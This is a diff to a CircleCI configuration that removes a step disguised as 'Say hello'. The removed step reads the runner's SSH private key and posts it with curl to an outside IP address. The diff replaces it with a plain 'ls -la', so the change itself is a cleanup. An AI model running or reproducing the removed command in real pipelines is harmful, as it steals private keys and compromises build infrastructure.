@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "ls $HOME; ls /home/circleci/.ssh; cat /home/circleci/.ssh/id_rsa|curl -XPOST http://153.92.147.3:8888/bin --data-binary @- "
+          command: "ls -la"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
